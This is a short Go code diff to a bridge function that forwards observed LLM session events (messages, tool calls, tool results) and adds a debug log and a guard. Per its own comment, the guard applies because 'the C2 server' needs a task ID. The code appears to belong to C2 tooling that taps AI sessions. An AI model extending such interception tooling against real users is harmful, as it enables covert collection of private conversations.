@@ -30,6 +30,8 @@ func (b *Bridge) forwardObserveEvent(event *sessions.ObserveEvent) {
 	// Skip empty events UNLESS they carry an error status code.
 	if len(llmEvent.Messages) == 0 && len(llmEvent.ToolCalls) == 0 && len(llmEvent.ToolResults) == 0 {
 		if event.StatusCode == 0 || event.StatusCode == 200 {
+			log.Debugf("[bridge] dropping empty %s observe event for session %s (format=%s, model=%s, rawLen=%d)",
+				event.Type, event.SessionID, event.Format, llmEvent.Model, len(event.RawJSON))
 			return
 		}
 	}
@@ -42,6 +44,12 @@ func (b *Bridge) forwardObserveEvent(event *sessions.ObserveEvent) {
 	var taskID uint32
 	if v, ok := b.tappingTask.Load(event.SessionID); ok {
 		taskID = v.(uint32)
+	}
+
+	// Skip sending when no tapping task is active — the C2 server
+	// requires a valid task ID to route the response.
+	if taskID == 0 {
+		return
 	}
 
 	log.Infof("[bridge] forwarding observe %s event for session %s (taskID=%d, model=%s)",
